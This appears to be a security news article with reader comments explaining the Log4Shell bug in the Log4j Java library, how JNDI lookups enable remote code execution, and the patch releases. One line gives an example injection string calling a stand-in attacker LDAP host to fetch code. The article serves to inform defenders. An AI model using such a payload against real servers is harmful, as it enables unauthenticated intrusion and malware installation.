@@ -1,0 +1,79 @@
+Sophos Home protects every Mac and PC in your home 
+Just when you thought it was safe to relax for the weekend…
+…and your cybersecurity Christmas decorations lit up with the latest funkily-named bug: Log4Shell.
+Apparently, early reports of the bug referred to it as “LogJam”, because it allows you to JAM dodgy download requests into entries in LOG files.
+But LogJam was already taken (in that one, LOG referred to discrete logarithms, as performed in cryptographic calculations, not to logfiles).
+So, Log4Shell it became.
+The name Log4Shell refers to the fact that this bug is present in a popular Java code library called Log4j (Logging for Java), and to the fact that, if successfully exploited, attackers get what is effectively a shell – a way to run any system code of their choosing.
+Unfortunately, the vulnerability was tweeted out as a zero-day hole (the name for a security bug that’s documented before a patch is out), and published as a proof-of-concept (PoC) on GitHub, so the world first got to hear about it while it was still unpatched.
+The bug, now officially denoted CVE-2021-44228, involves sending a request to a vulnerable server in which you include some data – for example, an HTTP header – that you expect (or know) the server will write to its logfile.
+But you booby-trap that data so that the server, while wrangling the data into a format suitable for logging, kicks off a web download as an integral part of constructing the needed log entry.
+And not just any old download: if the data that comes back is a valid Java program (a .class file, in the jargon), then the server runs that file to “help” it generate the logging data.
+The trick is that, by default, unpatched versions of the Log4j library permit logging requests to trigger general-purpose LDAP (directory services) searches, as well as various other online lookups.
+That “feature” exists in order to help you convert not-very-useful data, for example user IDs such as OZZJ5JYPVK, into human-reabable information that makes sense on your network, such as Paul Ducklin.
+These requests happen via a commonly-used Java toolkit known as JNDI, short for Java Naming and Directory Interface, which is a Java module that makes it easy for Java code to carry out online lookups such as the above-mentioned user-ID-to-real-name conversion.
+That sounds dangerous, and it is, because it means that data being logged can trigger server-side code execution, but you might consider it to be mostly harmless if those “helper requests” only ever reach out to fully-trusted naming-and-directory servers inside your own network.
+But many servers out there aren’t set up that way, and so malicious “logsploiters” could try embedding text such as {$jndi:ldap://dodgy.example:389/badcode} in the data they expect you to log…
+…in the hope that, in the process of logging the data, your server will automatically:
+Simply put, this is what the jargon calls unauthenticated remote code execution (RCE). 
+Without logging in, or needing a password or access token, cybercriminals could use an innocent-looking request to trick your server into reaching out, downloading their code, and infecting itself with their malware.
+Depending on what sort of access rights your server has on your internal network, an RCE like this could help cybercriminals to perform a wide range of nefarious tasks.
+As you can imagine, attackers could, in theory: leak data from the server itself; learn details about the internal network it’s connected to; modify data on the server; exfiltrate data from other servers on the network; open additional backdoors on the server or the network for future attacks; implant additional malware such as network snoopers, memory scrapers, data stealers, cryptominers…
+…and so on.
+Apache, which looks after the Log4j product, has published an handy security advisory about the issue.
+Recommended steps you can take include:
+For information on the Log4shell issue and Sophos services, please consult our Security Advisory SOPHOS-SA-20211210-log4j-rce.
+Update. Apache has patched Log4j twice more since this article came out. The first update, to 2.16.0, patches against CVE-2021-45046, where a non-default configuration could permit remote code execution or data exfiltration, and a default configuration could allow a denial of service attack causing the affected process to hang. The second update, 2.17.0, patches against CVE-2021-45105, where a non-default configuration could allow an infinite loop, causing a denial of service in a similar way to the flaw patched in 2.16.0.Note that patching to 2.17.0 includes all previous fixes, dealing with CVE-2021-44228, CVE-2012-45046 and CVE-2021-45105 at the same time. For ongoing information, please refer to the official About Apache Log4j page. [2021-12-18T11:45:00Z]
+LEARN MORE – LOG4SHELL IN DETAIL
+Log4Shell explained – how it works, why you need to know, and how to fix it
+
+
+LEARN MORE – HOW CYBERCRIMINALS ARE USING THIS IN THE WILD
+Log4Shell Hell: anatomy of an exploit outbreak
+
+
+Follow @NakedSecurity on Twitter for the latest computer security news.
+Follow @NakedSecurity on Instagram for exclusive pics, gifs, vids and LOLs!
+s/those if those/those;s/theoey/theory/
+🙂
+Fixed, thanks!
+And here I was thinking that I didn’t have the library. While I was installing Logstash today, what did I find? “log4j2.properties: Contains default settings for log4j 2 library. See Log4j2 configuration for more info.” There we go! This was a very, very timely article for me. Thanks Duck!
+Great, glad it pointed you in the right direction!
+Hi,
+Any info on Sophos Mobile Control (on premisse) about this vuln, and if it is affected?
+Regards,
+See the Security Advisory link at the very end of the article…
+Sophos Mobile: Not impacted. Sophos Mobile does not run an exploitable configuration.
+So there’s Java on your SMC server, but it was already unvulnerable before this flaw was announced. In other words, as far as I know you do not need to update anything or tweak any configuration settings.
+HtH.
+Thanks Paul, great info, I already saw related article, but there is no info if all versions of SMC are unvulnerable? It would be nice to know if any of versions is impacted. Regards, Edin.
+As far as I know the fact that the article gives a general all-clear means just that – if any specific version *were* affected they would be identified individually. 
+I can’t clarify with any more detail than that here – if you are worried, please drop your usual support person/sakes engineer/account manager/partner an email with your precise version number.
+HtH
+Wrong CVE
+Aaaaargh, how did that happen? (That is a rhetorical question, I know the answer. I mistyped it!)
+Fixed, thanks a lot for noticing!
+Thanks, Paul. I couldn’t figure out an easy way to quickly test my own server for this vulnerability, but I met all the criteria. 
+Thankfully, a rapid edit of the properties looks like the fastest resolution for now. 
+Thank you!
+Hi Paul – How do I check for installed vendor applications that may include the vulnerability as part of their product offering? Example: How would I know if a local install of an accounts package has the vulnerability? Is it as simple as searching for log4j*.jar on the machine?
+Looking for files called ‘log4j*.jar’ is the simplest and most effective first step I can think of. You will typically find that the directories where the offending files show up belong to a spoecific app, which tells you where to look for updates.
+It’s possible to build software packages that ship in proprietary archives that expand only at run time (some may expand directly into memory, though that is harder to orchestrate, or drop the files they need in a temporary folder that’s deleted on exit), so it’s theoretically possible to have software that uses log4j*.jar but where that file is rarely or never on disk…
+…but I think it’s much more likely that Java programs that use Log4j and that ship with their own copy of the code will save the Log4j files file in plain sight on disk.
+I found a few Log4j files I didn’t expect on my own computer, including in an Arduino toolset I had (for ESP32 coding), and in Google’s Android Studio. (I didn’t spend time to figure out which version Android Studio was using – I think it was Log4j 1.x –  because I need the app only occasionally and it was eating up more than 10% of my disk space, so my solution was to remove it entirely :-)
+Thanks Paul
+Pleasure. Glad you liked it.
+Hi Paul
+Thanks for this article, Sophos is not the Security we use or deploy to our clients, but your clear explanation in (near) layman’s terms is the best description of Log4shell I have come across and is a great advert for Sophos
+Thanks, glad to have helped.
+Great article, thanks! I’m wondering if it would do any good to turn the log level OFF as a first measurement?
+I don’t know (and for all you know the app might have its own ideas about some logging  events and enable them internally).
+Comment * 
+Name 
+Email 
+Website 
+ 
+
+
+
+Δ
